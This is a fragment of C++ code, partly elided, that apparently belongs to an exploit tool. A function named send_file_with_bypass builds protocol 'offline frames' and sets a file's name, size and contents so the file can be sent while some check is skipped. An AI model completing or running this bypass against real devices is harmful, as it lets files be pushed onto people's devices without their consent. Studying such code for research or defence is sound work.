...
const uint8_t BASE_FILE_OFFLINE_FRAMES_BUFFER[907] = {
    ...
    };
...
void send_file_with_bypass(IMedium *medium, const char *file_path, std::vector<uint8_t> file_name)
{
    ...
    std::unique_ptr<OfflineFrame> &file_offline_frame_is_deleted = offline_frames[2];
    std::unique_ptr<OfflineFrame> &file_offline_frame_is_not_deleted = offline_frames[3];
    std::unique_ptr<OfflineFrame> &file_done_offline_frame = offline_frames[4];

    logger_log(LoggerLogLevel::LEVEL_INFO, "Setting the name and the content for the file to send");
    file_offline_frame_is_not_deleted->mutable_v1()->mutable_payload_transfer()->mutable_payload_header()->set_file_name(file_name.data(), file_name.size());
    file_offline_frame_is_not_deleted->mutable_v1()->mutable_payload_transfer()->mutable_payload_header()->set_total_size(file_size);
    file_offline_frame_is_not_deleted->mutable_v1()->mutable_payload_transfer()->mutable_payload_chunk()->set_body(read_file_content(file_path)->data(), file_size);
